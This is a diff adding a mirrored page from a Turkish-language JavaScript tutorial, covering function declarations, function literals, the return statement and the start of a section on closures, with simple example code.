@@ -1,0 +1,2022 @@
+<?xml version="1.0" encoding="utf-8"?>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+											"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html lang="tr" xmlns="http://www.w3.org/1999/xhtml" xml:lang="tr">
+
+	
+<!-- Mirrored from www.bedriemir.com/JavaScript/b2/b2s5.htm by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 15 Feb 2018 03:11:48 GMT -->
+<head>
+    <meta name="revised" content="2026-07-15">
+    <link rel="canonical" href="https://nuriacar.com/bedriemir.com/JavaScript/b2/b2s5.html">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+		<meta
+			content="HTML Tidy for Windows (vers 1st February 2003), see www.w3.org"
+			name="generator" />
+					<!-- Made with AC Meta Tag Generator ver. 1.5
+							at: http://www.ACJavascripts.com -->
+		<meta http-equiv="Content-Type" content="application/xhtml+xml; charset=utf-8" />
+		<meta http-equiv="Content-Language" content="tr" />
+		<meta http-equiv="Content-Style-Type" content="text/css" />
+		<meta http-equiv="Content-Script-Type" content="text/JavaScript" />
+		<meta name="Title" content="WEBTECH JavaScript Turkish Tutorial" />
+		<meta name="Subject" content="JavaScript Turkish Tutorial" />
+		<meta name="Description" content="JavaScript Tutorial in Turkish Language" />
+		<meta name="Keywords" content="JavaScript Tutorial Turkish" />
+		<meta name="Language" content="tr" />
+		<meta name="Abstract" content="JavaScript Turkish Tutorial" />
+		
+		<meta name="Publisher" content="Prof. Dr. Bedri Doğan Emir" />
+		<meta name="Distribution" content="Local" />
+		<meta name="Robots" content="Index" />
+		<link rel="stylesheet" type="text/css" href="../css/JSstyle.css" />
+		<title>b2s5</title>
+	</head>
+	<body>
+		<noscript>
+			<p>
+				Lütfen JavaScript Program Desteğini Açınız veya
+				JavaScript programlamasını destekleyen bir belge
+				çözümleyici kullanınız.
+				(örnek :MSIE 7 veya FireFox2)
+			</p>
+		</noscript>
+		<p>
+			<img src="../images/banner.png" class="banner" alt="Banner" />
+		</p>
+		<div class="navtop">
+			<p>
+				<a href="../index.html"><img class="navpad"
+																				alt="index" src="../images/index.gif" id="img1" /></a>
+				<a href="b2s4.html"><img class="navpad"
+																				alt="previous" src="../images/previous.gif" id="img2" /></a>
+				<a href="b2s6.html"><img class="navpad"
+																						alt="next" src="../images/next.gif" id="img3" /></a>
+			</p>
+		</div>
+		<p class="chapter">
+			JavaScript Temelleri
+		</p>
+		<p class="chapter">
+			Bölüm 2
+		</p>
+		<p class="chapter">
+			Temel Bilgiler
+		</p>
+		<p class="title">
+			2.5 - Fonksiyonlarla Çalışmak 
+		</p>
+		<p class="pagenum">
+			Bölüm 2 Sayfa 5
+		</p>
+		<p class="subheading" id="namespace">
+			2.5.1 - Fonksiyonların Tanıtımı, Fonksiyon İsim Uzayı
+	</p>
+		<p class="indent">
+			Fonksiyonlar, ana programdan bağımsız olarak kod çalıştırabilen
+		alt programlardır. Fonksiyon gövdesi olarak adlandırılan, fonksiyon 
+		kod çalıştırma alanında, ayrı bir program alanı olarak, aynen ana program
+				alanı gibi, fakat ana program alanından bağımsız olarak program adımları
+				çalıştırılır ve sonuçlar ana program alanına aktarılabilir. Fonksiyonlar
+				tanımlandıkları  anda çalıştırılmazlar, Bir dış program adımından veya
+				kendi içinden (rekürsif fonksiyonlar) çağrılarak çalışabilirler.
+		</p>
+		<p class="indent">
+			Fonksiyonlar, programların gerçek yapıtaşlarıdır. Çünkü, modern tasarım
+			kavramına göre, programlar fonksiyonların içinde çalıştırılır, ana program
+			sadece çesiştli fonksiyonlar aralarında bilgi alışverişini koordine eder. 
+		</p>
+		<p class="indent" id="birinci">
+			Bilgisayar programlamasında kullanılan fonksiyonlar, 1930 larda geliştirilen lambda 
+			kuramından (&lambda;-cebri) geniş ölçüde etkilenmiştir. 	&lambda; Kuramı modern 
+			program dilerinde, fonksiyonların &lambda; kuramı kurallarına
+			uygun olarak tasarlanmasına yol açmıştır. Bu konuda, Scheme, ML, Haskell,
+			Lisp (özellikle Pure Lisp), Pascal, Python gibi modern programlama dilleri
+			örnek olarak verilebilir. Javascript programlama dili de, fonksiyonları &lambda; kuramına
+			en yakın olarak tasarlanmış olan az sayıda programlama dilinden biridir.		</p>
+		<p class="indent">JavaScript programlama dilininin üstün yönlerinden birisi,
+			fonksiyonlarının &#x3BB; kuramına tam uyumlu olarak tasarlanmış olmaları ve
+			bunun sonucu olarak, fonksiyonlarının birinci sınıf nesneler olmasıdır.
+			1960 larda Christopher Strachey tarafından tanımlanmış olan birinci sınıf
+			nesneler, </p>
+		<ul class="list">
+			<li>Anonim literal değer olarak ifade edilebilirler, </li>
+			<li>Değişkenlere atanabilirler, </li>
+			<li>Veri yapılarında (nesnelerde) saklanabilirler, </li>
+			<li>Herhangibir isme bağlı olmadan özel kimlikleri bulunabilir, </li>
+			<li>Başka birimlerle eşitlik için kıyaslanabilirler, </li>
+			<li>Başka fonksiyonlarda parametre (argüman) olarak kullanılabilirler. </li>
+			<li>Fonksiyonlarda geri döndürülebilirler, </li>
+			<li>Çalışma anında (Runtime) yapılandırılabilirler, </li>
+			<li>Print edilebilir, </li>
+			<li>Okunabilir, </li>
+			<li>Dağıtık sistemlerde dağıtılabilir </li>
+			<li>Çalışan proseslerin dışında saklanabilirler.</li>
+		</ul>
+		<p class="indent">
+			JavaScript fonksiyonları, birinci
+			sınıf nesneler olarak yerleştirilmişlerdir. Olayın öneminin vurgulanması
+			için bunun nekadar zor  olduğunu ve ne kadar az programlama dilinde bu
+			olanağın sağlanmış olduğunu belirtmek yeterli olacaktır. JavaScript fonksiyonlarının,
+			birinci sınıf nesneler olarak  yerleştirilebilmiş olması, Javascript
+			programlama diline uygulamada büyük esneklik ve uygulama özgürlüğü sağlamaktadır.
+		</p>
+		<p class="indent">
+			Javascript programlama dilinde, fonksiyonlar, JavaScript yorumlayıcısına
+			üç türlü tanıtılabilirler. Bunlar, 
+		</p>
+		<ul class="list">
+		<li>
+			<span class="keyw">function</span> bildirimi,
+		</li>
+		<li>
+			Fonksiyon literalleri,
+		</li>
+		<li>
+			Fonksiyon nesneleri
+		</li>
+		</ul>
+		<p class="nonindent">
+			olarak sayılabilir. 
+		</p>
+		<p class="indent">
+			Bunlardan ilki, yani function bildirimi JavaScript programlama dili
+			için temel fonksiyon tanımlama yöntemidir. Bu yöntemle bildirilen fonksiyonlar sadece bir
+			kez çözümlenirler ve program belleğine yerleşirler. Bu yöntemle tanıtılmış
+			fonksiyonlar, gerçek alt programlar olarak görev yaparlar. İkinci yöntem, 
+			fonksiyon literalleri olarak tanımlanan bir yöntedir Bu yöntem daha az kullanılır ve 
+			çoğunlukla bir tek defa kullanılacak ve isimlendirilmesi gerekli olmayan, 
+			ve bir ifade gibi tanıımlanan bir fonksiyon türüdür. Fonksiyon literalleri
+			de tanımlandıktan sonra bir kez çözümlenirler. Fonksiyon nesneleri, 
+			bölüm<a href="../b7/b7s1.html">7</a> de açıklanacağı gibi, 
+			öntanımlı <span class="keyw">Function</span><span class="op">()</span>
+			nesne yapılandıcı fonksiyonunda yararlanılarak yaratılan <span class="keyw">Function</span>
+			nesne sınıfı örnekleridir. Fonksiyon nesnelerinin yazılımları 
+			alışılmamaış olduğundan ve her çağrıldıklarında yeniden çözümlenmek 
+			zorunda olduklarından dolayı performans kaybı yarattıklarından ve 
+			işlevleri zaten fonksiyon literalleri tarafından yerine getirildiğinden, 
+			kullanım alanları hiç yok gibidir. 
+		</p>
+		<p class="indent">
+			Burada sadece genel fonksiyon bildirimi  ve fonksiyon literalleri
+			incelenecektir. Fonksiyon nesneleri, <a href="../b7/b7s1.html">bölüm 7</a> de
+			<span class="keyw">Function </span>nesne sınıfı ile birlikte incelenecektir.
+		</p>
+		
+		<p class="subheading" id="genel">2.5.2 - function Bildirimi 
+	</p>
+		<p class="indent"> Fonksiyonların en genel tanıtımları, fonksiyon bildirimi
+			kullanılarak yapılır. <a href="b2s1.html#bildirimler">function</a> bildirimi, <a href=
+"http://www.ecma-international.org/publications/standards/Ecma-262.htm">ECMA-262</a> de
+			bildirimler (statements) arasına alınmamıştır. 
+			Microsoft <a href="http://msdn.microsoft.com/en-us/library/3xcfcb93(VS.85).aspx">JScript</a> spesifikasyonda
+			ise bildirimler arasında görülmektedir. İşlevi açısından bildirimlere daha
+			yakın olan, <a href="b2s1.html#bildirimler">function</a> bildirimini biz de
+			bildirimler arasında inceleyeceğiz. Aslında isterse <a href=
+"http://www.ecma-international.org/publications/standards/Ecma-262.htm">ECMA-262</a> spesifikasyonun
+			öngördüğü gibi, bağımsız bir saklı sözcük olsun, isterse Microsoft <a href="http://msdn.microsoft.com/en-us/library/3xcfcb93(VS.85).aspx">JScript</a> spesifikasyonda
+			öngörüldüğü gibi, bir bildirim olarak kabul edilsin, <a href="b2s1.html#bildirimler">function</a> bildiriminin
+			işlevi değişmemektedir. <a href="b2s1.html#bildirimler">function</a> Bildirimi
+			ile JavaScript yorumlayıcısına tanıtılan bir fonksiyon, <span class="keyw">Function </span>nesne 
+			sınfının yeni bir örneği olarak kabul edilir.
+			<a href="b2s1.html#bildirimler">function</a> Bildirimi kullanılarak
+			yapılan genel <span class="keyw">function</span> tanıtımı, </p>
+		<pre>
+<span class="keyw-25">function</span> fonksiyonAdı<span 
+			class="keyw">(</span>[argüman1 [, ...[, argümanN]]]<span 
+			class="keyw">)</span> <span 
+			class="op">{</span><em class="att">fonksiyon gövdesi</em><span 
+			class="op">}</span>
+		</pre>
+		<p class="nonindent"> şeklindedir. Burada, </p>
+		<p class="indent"> fonksiyonAdı : <span class="str">(Gerekli)</span> Yeni oluşturulacak
+			fonksiyonun adı. </p>
+		<p class="indent"> argüman1..argümanN : <span 
+			class="str">(İsteğe Bağlı)</span> Fonksiyonun kabul edeceği argümanların listesi.
+			Bir fonksiyonun alabileceği argüman sayısı 255 dir.</p>
+		<p class="indent"> <em>fonksiyon gövdesi</em> : Fonksiyon çağrıldığında, çalıştırılacak
+			program adımları (eğer sadece bir tek program adımı varsa, gruplama işlemcisine
+			(parantezlere) gerek kalmayabilir. Fakat, bir konvansiyon olarak, her fonksiyon,
+			mutlaka gruplama işlemcisi ile birlikte belirtilir. </p>
+		<p class="indent"> Bu tanımdan, fonksiyon bildirimlerinde, fonksiyonların,
+			tanımlayıcı (identifier) kısıtlarını karşılayacak bir ad ile tanıtılmaları
+			gerektiği, isteğe bağlı olarak argümanlar alabildikleri isteğe bağlı olarak
+			gövdelerinin olabileceği anlaşılır. Gövdesi olmayan bir fonksiyon, bir işlev
+			de yapamayacağı için, bir amaç için oluşturulmuş fonksiyonların, mutlaka bir
+			gövdelerinin olması gerekir. 
+		</p>
+		<p class="indent"><a href="b2s1.html#bildirimler">function </a>Bildirimi kullanılarak
+			yapılan genel <span class="keyw">function</span> tanıtımı, fonksiyonlar için
+			esas tanıtım yöntemidir. Fonksiyon olarak tanıtılmış bir fonksiyon, tanıtıldıktan
+			sonra, programcının envanterine geçer ve program kitaplığının ilişkilendirildiği
+			her programda kullanılabilir. Bunun dışındaki tanıtım metotları, bu genelleşmeyi
+			sağlamaz.
+		</p>
+		<p class="indent">
+			Her fonksiyon, bir <span class="keyw">Function</span> nesne sınıfı örneğidir. Bu nesne sınfının
+			tüm özelliklerine sahiptir. Bu özellikleri ileride, <span class="keyw">Function</span> nesne sınıfının
+			incelendiği <a href="../b7/b7s1.html">bölüm 7</a> de göreceğiz.
+		</p>
+		<p class="indent">
+			Fonksiyonlarda <span class="keyw">this</span> sözcüğü, fonksiyonu değil çağıran kapsamı
+			işaret eder. Bu nedenle fonksiyonları  kendi gövdeleri dahil her yerden kendi isimleri
+			ile çağırmak gerekir.
+		</p>
+		<p class="indent">
+			<span class="keyw-25">function</span> Bildirimi ile tanıtılan fonksiyonlar,
+			tanıtılmadan önce de çağrılabilirler. Fakat bu sağlık verilmez.
+			JavaScript programlama dili iyi yazım konvansiyonları, fonksiyonların önce
+			 tanıtılmaları sonra çağrılmalarını öngörür.
+		</p>
+		<p class="indent">
+			<span class="keyw-25">function</span> Bildirimi ile tanıtılan fonksiyonların
+			tanıtılmaları ile beraber, fonksiyonun adını ile aynı adla bir değişken yaratılır. 
+			Bu değişken adından, fonksiyonların başka değişkenlere atanmasında yararlanılır.
+		</p>
+		<p class="indent" id="b2.5.2-uyg-1">
+			JavaScript fonksiyonları birinci sınıf nesneler olarak düzenlenmiştir. Fonksiyonlar değişkenlere
+			atanabilirler. Fakat fonksiyonlar nesne niteliğindedir ve değişkenlere, kopyaları değil 
+			referansları aktarılır. Atamalar, referans aktarımı olduğundan, aynı atama işlemleri gibi, 
+			fonksiyon çağırma işlemcisi <span class="op">()</span> kullanılmadan yapılır. Aşağıda 
+			<a href="../uygulamalar/b2.5.2-uyg-1-js.html">JavaScript kodları</a> verilmiş 
+			olan <a href="../uygulamalar/b2.5.2-uyg-1.html">uygulamada</a> bu yöntem açıklanmaktadır:
+		</p>
+		<pre>
+<span class="keyw-50">...</span>
+
+<span class="keyw-25">function</span> ekle<span 
+			class="op">(</span>a<span 
+			class="op">,</span> b<span 
+			class="op">)</span> <span 
+			class="op">{</span>
+			
+<span class="keyw-50">return </span>a <span 
+			class="op">+</span> <span 
+			class="str">' '</span> <span 
+			class="op">+</span> b<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+<span class="keyw-25">function</span> çalıştırFonksiyon<span 
+			class="op">() {</span>
+			
+<span class="keyw-50">var</span> x <span 
+			class="op">=</span> <span 
+			class="keyw">null</span><span 
+			class="op">,</span> sözelVeri1 <span 
+			class="op">=</span> <span 
+			class="str">'Neşeli'</span><span 
+			class="op">,</span> sözelVeri2 <span 
+			class="op">=</span> <span 
+			class="str">'Günler'</span><span 
+			class="op">,</span> sonuç <span 
+			class="op">=</span> <span 
+			class="keyw">null</span><span 
+			class="op">;</span>
+			
+<span class="pl-50">x</span> <span 
+			class="op">=</span> ekle<span 
+			class="op">;</span>
+			
+<span class="pl-50">sonuç</span> <span 
+			class="op">=</span> x<span 
+			class="op">(</span>sözelVeri1<span 
+			class="op">,</span> sözelVeri2<span 
+			class="op">);</span>
+			
+<span class="pl-50">sonuçVeTipYaz</span><span 
+			class="op">(</span><span 
+			class="str">'x = '</span><span 
+			class="op">,</span> x<span 
+			class="op">,</span> <span 
+			class="str">'b2.5.2-uyg-1-sonuç-1'</span><span 
+			class="op">);</span>
+			
+<span class="pl-50">sonuçVeTipYaz</span><span 
+			class="op">(</span><span 
+			class="str">'sonuç = '</span><span 
+			class="op">,</span> sonuç<span 
+			class="op">,</span> <span 
+			class="str">'b2.5.2-uyg-1-sonuç-2'</span><span 
+			class="op">);</span>
+<span class="op-25">}</span>
+<span class="keyw-50">...</span>
+		</pre>
+		
+		<p class="cursive-green">Program Sonucu :
+		</p>
+		
+		<p class="indent" id="b2.5.2-uyg-1-sonuç-1">
+		</p>
+		
+		<p class="indent" id="b2.5.2-uyg-1-sonuç-2">
+		</p>
+		<p class="indent">
+			Bu <a href="../uygulamalar/b2.5.2-uyg-1.html">uygulamanın</a> sonuçları çok önemlidir. İlk olarak,
+			burada x = ekle; ifadesi, ekle değişkenindeki fonksiyon referansının kopyasını x 'e ata anlamına
+			gelmektedir. Bu atamadan sonra x  değişkeni, ekle değişkeni gibi, isminin yanına bir fonksiyon 
+			çağırma operatörü eklenerek, aynı ekle değişkeni gibi fonksiyonu çağırabilir hale gelmektedir. Sonuç da
+			x<span class="op">(</span>sözelVeri1<span class="op">,</span> sözelVeri2<span 
+			class="op">)</span> şeklinde, yeni değişkenin fonksiyonu çağırması ile oluşturulmuştur.
+		</p>
+		<p class="indent">
+			Bu <a href="../uygulamalar/b2.5.2-uyg-1.html">uygulamanın</a> ikinci sonucu, fonksiyonun
+			veri tipinin yeni bir veri tipi olan function tipinde olmasıdır. JavaScript programlama dilinde, 
+			veri tipleri, <span class="keyw">undefined</span>, <span class="keyw">null</span>, boolean,
+			number, string, object ve function veri tipleridir. Yani, fonksiyonlar özel bir veri tipidir.
+		</p>
+		<p class="indent">
+			JavaScript programlama dilinde, her fonksiyonu yapılandırıcı bir fonksiyon (constructor) olabileceği
+			düşünülerek her tanımlanan fonksiyona bir <span class="keyw">prototype</span> özelliği verilir.
+			Bu son derece sıradışı bir olaydır, çünkü <span class="keyw">Function</span> nesne sınıfından 
+			başka hiçbir nesne sınıfının örneklerinin <span class="keyw">prototype</span> özelliği yoktur. 
+			Başka nesne sınıflarının örnekleri, kendi sınıflarının prototipine sahip olurlar. Nesnelerin 
+			<span class="keyw">prototype</span> özellikleri, <a href="../b4/b4s1.html">Object nesne sınıfı</a>
+			ile birlikte incelenecektir. 
+		</p>
+		<p class="indent">
+			Her fonksiyon tanımında, o fonksiyona ait bir argüman nesnesi de oluşturulur.
+			Argüman nesnesi bir dizi nesnesine benzer, dizinin elemanları formal parametre
+			listesindeki argümanlara karşı gelir. Bu nesnenin kullanımı, 
+			<a href="../b8/b8s1.html">Array nesne sınıfı</a> ile birlikte incelenecektir.
+			Bu nesnenin kullanılmasını doğrulayacak bir uygulama yoktur. Her fonksiyon
+			zaten formal parametre listesi ile tanımlanabilmekte ve aynı parametrelerle
+			de çağrılabilmektedir.
+		</p>
+		<p class="indent">
+			<span class="keyw">function</span> Bildirimi ile oluşturulmuş fonksiyonlar sadece bir kez çözümlenir
+			ve istendiği kadar çağrılabilir. Bu şekilde, her çağrılışta yeniden çözümlenen fonksiyon nesnelerine oranla 
+			önemli bir peformans kazancı sağlanmaktadır.
+		</p>
+		<p class="indent">
+			<span class="keyw">function</span> Bildirimi ile oluşturulmuş fonksiyonlar, mevcut çalıştırma kapsamının
+			sonuna yeni bir kapsam alanı oluşturacak şekilde eklenir. Bu tür bir eklenmeye, kapsam zincirine yeni bir 
+			halka eklenmesi olarak nitlendirilir. Bu yeni kapsam alanı, bir üst kapsam alanınından ayrı ve bağımsızdır. 
+			Fakat, bir üst kapsam alanından bilgi alabilir ve bilgi verebilir.
+		</p>
+		<p class="subheading" id="functionliterals">2.5.3 - Fonksiyon Literalleri
+	</p>
+		<p class="indent">
+			Javascript programlama dilinde fonksiyonların gerçek &lambda; olmalarının
+			sonucu olarak birinci sınıf nesne niteliğinde olmaları, fonksiyonların, 
+			<a href="b2s5.html#birinci">2.5.2</a>
+			paragrafında belirtildiği gibi çalışma anında (runtime) yapılandırılabilmeleridir.
+			Fonksiyon literalleri bu özellikten yararlanmaktadırlar. 
+		</p>
+		<p class="indent">
+			Fonksion literalleri iki türlü tanıtılabilirler. Bunlardan ilki aşağıda
+				görülebileceği gibi, isimsiz fonksiyon literalleri olarak tanıtma yöntemidir.
+				İsimsiz fonksiyon literalleri, anonim (klasik grekçe Sanskrit kökenli)
+				fonksiyonlar olarak da adlandırılırlar. Anonim fonksiyonlar, 
+		</p>
+		<pre>
+<span class="keyw-25">var</span> değişken İsmi <span 
+			class="op">=</span> <span 
+			class="keyw">function(</span>[argüman1 [, ...[, argümanN]]]<span 
+			class="keyw">)</span> <span 
+			class="op">{</span><span 
+			class="att"><em>fonksiyon gövdesi</em></span><span 
+			class="op">}</span><span 
+			class="op">;</span>
+		</pre>
+		<p class="nonindent" id="b2.5.3-uyg-1">
+			olarak tanımlanırlar. Anonim fonksiyonlara bir örnek olarak, 
+			<a href="../uygulamalar/b2.5.3-uyg-1-js.html">JavaScript kodları</a> 
+			aşağıda görülen bir <a href="../uygulamalar/b2.5.3-uyg-1.html">uygulama</a>
+			verilmiştir.
+		</p>
+		<pre>
+<span class="keyw-50">...</span>
+<span class="keyw-50">var</span> toplam <span 
+			class="op">=</span> <span 
+			class="keyw">function</span> <span 
+			class="op">(</span>a<span 
+			class="op">,</span> b<span 
+			class="op">) {</span>
+<span class="keyw-75">return </span><span 
+			class="op">(</span>a <span 
+			class="op">+</span> b<span 
+			class="op">).</span><span 
+			class="keyw">toFixed</span><span 
+			class="op">(</span>3<span 
+			class="op">);</span>
+<span class="op-50">};</span>
+
+<span class="pl-50">bilgiYaz</span><span 
+			class="op">(</span>toplam<span 
+			class="op">(</span>12.67<span 
+			class="op">,</span> 190.789)<span 
+			class="op">,</span> <span 
+			class="str">'b2.5.3-uyg-1-sonuç-1'</span><span 
+			class="op">);</span>
+<span class="keyw-50">...</span>
+		</pre>
+		<p>
+			<span class="cursive-green">Sonuç : </span>
+			<span class="cursive-red" id="b2.5.3-uyg-1-sonuç-1"></span>
+		</p>
+		<p class="indent">
+			Yukarıda görülen uygulamanın 
+			<a href="../uygulamalar/b2.5.3-uyg-1-js.html">kodlarında</a>,
+			fonksiyon literalinin tanımından sonra, ifade sonlandırıcısı <span 
+			class="op">;</span> konulduğuna dikkat edilmelidir. Bunun nedeni, 
+			fonksiyon literali tanımının bir ifade olmasıdır. Bu nedenle, 
+			fonksiyon literalleri, fonksiyon ifadeleri olarak da adlandırılır. Yine yukarıdaki
+			uygulamanın <a href="../uygulamalar/b2.5.3-uyg-1-js.html">kodlarında</a>
+			görülen, <span class="keyw">toFixed</span><span class="op">()</span>
+			metodu, sayıların ondalık değerlerinin biçimlendirilmesi için sağlanmış
+			bir sayısal nesne örneği öntanımlı <a href="../b6/b6s1.html#tofixed">metodudur.</a>
+		</p>
+		<p class="indent">
+			Fonksiyon literallerinin ikinci tür tanıtımı, isimli fonksiyon literalleri
+				olarak tanıtımdır. İsimli fonksiyon literallerinde tanımlanan fonksiyonun 
+				bir ismi olduğu için, anonim olarak nitelendirilemezler.
+				Bir fonksiyon literaline isim verilmesi sadece
+				fonksiyonların kendi kendini çağırması (rekürsiyon)
+				yötemleri için gerekli olacaktır. İsimli fonksiyon  literallerinin tanıtımı, 
+		</p>
+				<pre>
+<span class="keyw-25">var</span> değişken İsmi <span 
+			class="op">=</span> <span 
+			class="keyw">function</span> fonksiyonAdı<span 
+			class="keyw">(</span>[argüman1 [, ...[, argümanN]]]<span 
+			class="keyw">)</span> <span 
+			class="op">{</span><span 
+			class="att"><em>fonksiyon gövdesi</em></span><span 
+			class="op">}</span><span 
+			class="op">;</span>
+		</pre>
+		<p class="nonindent" id="b2.5.3-uyg-2">
+			şeklinde yapılır. İsimli fonksyon literallerine bir örnek olarak, 
+			<a href="../uygulamalar/b2.5.3-uyg-2-js.html">kodları</a> aşağıda görülen, <a 
+			href="../uygulamalar/b2.5.3-uyg-2.html">uygulama</a> verilmiştir.
+		</p>
+		<pre><span class="keyw-50">...</span>
+
+<span class="keyw-50">var</span> çarpma <span 
+			class="op">=</span> <span 
+			class="keyw">function</span> çarpım <span 
+			class="op">(</span>a<span 
+			class="op">,</span> b<span 
+			class="op">) {</span>
+<span class="keyw-75">return </span><span 
+			class="op">(</span>a <span 
+			class="op">*</span> b<span 
+			class="op">).</span><span 
+			class="keyw">toFixed</span><span 
+			class="op">(</span>3<span 
+			class="op">);</span>
+<span class="op-50">};</span>
+
+<span class="pl-50">bilgiYaz</span><span 
+			class="op">(</span>çarpma<span 
+			class="op">(</span>172.26<span 
+			class="op">,</span> 5.86)<span 
+			class="op">,</span> <span 
+			class="str">'b2.5.3-uyg-2-sonuç-1'</span><span 
+			class="op">);</span>
+<span class="keyw-50">...</span>
+		</pre>
+		<p>
+			<span class="cursive-green">Sonuç : </span>
+			<span class="cursive-red" id="b2.5.3-uyg-2-sonuç-1"></span>
+		</p>
+		<p class="indent">
+			Fonksiyon literalleri, aynı fonksiyon bildirimi ile tanımlanmış fonksiyonlar gibi 
+			tanımlandıktan sonra sadece bir kez çözümlenirler (parse)
+			ve atandıkları kapsam alanında atandıkları değişken aracılığı ile çağrılabilirler.
+			Yani gerek fonksiyon literallerinin, gerekse fonksiyon bildirimi ile tanımlanmış 
+			fonksiyonlar, performans kaybına neden olmazlar. Fonksiyon nesnelerinin ise, 
+			her çağrılışta yeniden çözümlenmeleri gerektiğinden özellikle döngü içlerinde,
+			performans kaybına neden olurlar. 
+		</p>
+		<p class="indent">
+			Fonksiyon literalleri, aynı fonksiyon bildirimi ile tanımlanmış fonksiyonlar gibi,
+			tanımlandıkları kapsam alanını kalıtımla kazanırlar ve bu nedenle, biraz sonra
+			inceleyeceğimiz kapalı devreler yaratabilirler. Fonksiyon nesneleri ise,
+			sadece global kapsam alanını kalıtımla kazanabilirler ve bu yüzden kapalı devreler
+			yaratamazlar.
+		</p>
+		<p class="indent">
+			JavaScript programlama dilinde temel fonksiyon tanımlama yöntemi, genel fonksiyon bildirimidir.
+			Genel fonksiyon bildirimi ile tanımlanan bir fonksiyon, programın envanterine
+			geçer ve ve programın her tarafından bir sınırlama olmaksızın çağrılabilir.
+			Buna karşın, fonksiyon literalleri erişilebilirlikleri sadece atandıkları 
+			değişkenin kapsam alanı ile sınırlıdır. Bu açıdan, fonksiyon literallerinin 
+			kullanımları daha azdır ve sadece özel durumlarla kısıtlıdır. Genel fonksiyon 
+			bildiriminin yeterli olacağı işlevler için, fonksiyon literallerinin kullanımı anlamsız 
+			olacaktır.
+		</p>
+		<p class="subheading" id="return">2.5.4 - return Bildirimi 
+	</p>
+		<p class="indent"> 
+			Fonksiyon isim uzayı, aynen global isim uzayı gibi her türlü kodu
+			bağımsız olarak çalıştırılabilir. Bu bir bağımsız kod çalıştırma alanıdır
+				ve  global çalıştırma alanından izoledir. Fonksiyon alanında alınan sonuçlar
+			istenirse global çalıştırma alanına (üst düzey programlama alanına döndürülebilr.
+			Bunun için kullanılabilen <a href="b2s1.html#bildirimler">return</a> bildirimi,
+			fonksiyonun program adımlarını çalıştırmasını keser ve argümanı olan ifade
+			 sonucunu fonksiyonu çağıran kod çalıştırma alanına döndürür. <a href=
+			"b2s1.html#bildirimler">return</a> Bildiriminin söz yazımı, 
+		</p>
+		<pre>
+<span class="keyw-25">return</span> [<strong>(</strong>][<span>ifade</span>][<strong>)</strong>]<span 
+			class="op">;</span> 
+		</pre>
+		<p class="nonindent"> 
+			şeklindedir. Gruplama işlemcisinin (parantez) kullanımı isteğe bağlıdır fakat 
+			konvansiyonel olarak kullanımı yapılmamaktadır.
+		</p>
+		<p class="indent">
+			Bölüm 1.6.2 de incelenmiş olan <a href="../b1/b1s6.html#structural">yapısal
+			 programlama</a> prensiplerine göre, fonksiyonlara tek noktadan giriş, tek
+			 noktadan çıkış sağlanmalıdır. Javascript programlama dili, von Neumann yapılanmasına
+			tam olarak uyum sağlamış bir yapılanma ile tasarlanmıştır. Bu nedenle,
+			  her fonksiyonda sadece bir tek <a href="b2s1.html#bildirimler">return</a> 
+			bildiriminin değer döndürmesi gözetilir.
+		</p>
+		<p class="subheading" id="closures">2.5.5 - İçiçe Yuvalanmış Fonksiyonlar- Kapalı Devreler
+	</p>
+		<p class="indent">
+			Bir fonksiyon başka bir fonksiyon içinde tanımlanırsa bir kapalı devre (closure) oluşur. Kapalı devreler,
+			JavaScript programlama dilinin en üstün yönlerinden biridir. Java gibi programlama dillerinde, bir fonksiyon geri
+			dönüşü gerçekleştirdiğinde, ilgili program hafıza bölgesi (stack frame) , alt programın tüm değişkenleri ile birlikte
+			ortadan kalkar. JavaScript'te ise, tamamen ortadan kalkmaz ve iç fonksiyon dış fonksiyonun değişkenlerine erişebilir.
+		</p>
+		<p class="indent">
+			Kapalı devreler, anlaşılması ve uygulanması zor olan ileri düzey konulardır. Tam olarak tanımı üzerinde dahi henüz
+			fikir birliğine varılamamıştır. En güncel 
+			<a href="http://www.eclipsezone.com/forums/thread.jspa?messageID=92099076">açıklama</a>, bu konunun
+			fonksiyonlarla değil değişkenlerle ilgili olduğudur. Bir sistem tüm değişkenlerine bir değere bağlayabiliyorsa (bind) 
+			bu sistem kapalı (closed) eğer dış değere gereksinme duyan serbest (sistem içinden bir değere bağlanamayan), 
+			değişkenler varsa, bu sistem, açık (open) bir sistemdir ve serbest değişekenini bağlayabilecek bir sistemle 
+			kapanmaya (closure) yatkındır. Böyle bir sistem çoğunlukla bir fonksiyondur.
+		</p>
+		<p class="indent">
+			JavaScript fonksiyonları, üstün statik veya sözlüksel (lexical) olarak
+				adlandırılan kapsam alanına sahiptir. Ayrıca JavaScript fonksiyonları,
+				parçalanamaz (immutable) niteliktedir. Bu niteliklerinden dolayı, fonksiyon
+				tanımında tanımlanan tüm içerik, kullanımda kaldığı kadar yani tüm fonksiyonun
+				 çalışması tamamlanana kadar program belleğinin belirli bir bölgesinde
+				 kalır. Fonksiyon içeriği parçalanamaz olduğundan, İç fonksiyonun kullandığı 
+				 dış değişken değeri kopyalanmaz ve tüm fonksiyon içeriği referansla aktarılır. 
+				 Bu nedenle en son güncellenmiş dış fonksiyon değişkeni  değeri iç fonksiyona 
+				 aktarılır. Dış fonksiyonun  çalışması tamamlanınca, iç fonksiyonun çağrısı 
+				 devam ettiğinden dış fonksiyon içeriği bellekte
+				kalmaya devam eder. Dış fonksiyon her çağrılışta, program belleğinde
+				kapalı devrenin işgal ettiği eski alan kalır ve yeni bir kapalı alan
+				bölgesi oluşturulur. Kapalı devrenin işgal ettiği program bellek alanları,
+				JavaScript çöp toplayıcısı tarafından boşaltılmaya çalışılır. Bu yüzden,
+				çok tekrarlı iteratif sistemlerde, kapalı devre uygulaması, çöp toplayıcısının
+				yetersiz çalışması sonucunda program belleğini aşırı doldurabilir.		</p>
+		<p class="indent" id="b2.5.5-uyg-1">
+			Sadece tanımlandıkları kapsamı içerebilen fonksiyon bildirimleri ve 
+			fonksiyon ifadeleri ile oluşan fonksiyonlar kapalı devreler oluşturabilir. Bu konuda bir 
+			<a href="../uygulamalar/b2.5.5-uyg-1.html">uygulama</a> sayfasında çalışan
+			<a href="../uygulamalar/b2.5.5-uyg-1-js.html">JavaScript programı</a> ve 
+			verdiği sonuç, aşağıda görülmektedir:
+		</p>
+		<pre>
+<span class="keyw-50">...</span>
+
